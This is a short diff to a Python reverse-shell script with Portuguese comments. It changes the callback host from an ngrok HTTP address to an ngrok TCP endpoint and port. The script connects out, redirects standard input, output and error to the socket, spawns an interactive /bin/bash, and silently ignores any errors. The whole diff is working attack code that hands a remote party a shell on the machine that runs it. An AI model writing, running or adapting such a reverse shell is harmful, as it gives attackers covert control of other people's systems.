@@ -2,8 +2,9 @@ import socket
 import os
 import pty
 
-HOST = "0098e90c3898.ngrok-free.app"  # Corrigido: sem https://
-PORT = 4444
+# NOVOS DADOS DO NGORK
+HOST = "0.tcp.sa.ngrok.io" 
+PORT = 18752
 
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -13,8 +14,7 @@ try:
     os.dup2(s.fileno(), 1)
     os.dup2(s.fileno(), 2)
     
-    # O Linux tem /bin/bash, então isso funciona perfeitamente lá.
-    pty.spawn("/bin/bash") 
+    pty.spawn("/bin/bash")
     
 except Exception as e:
     pass
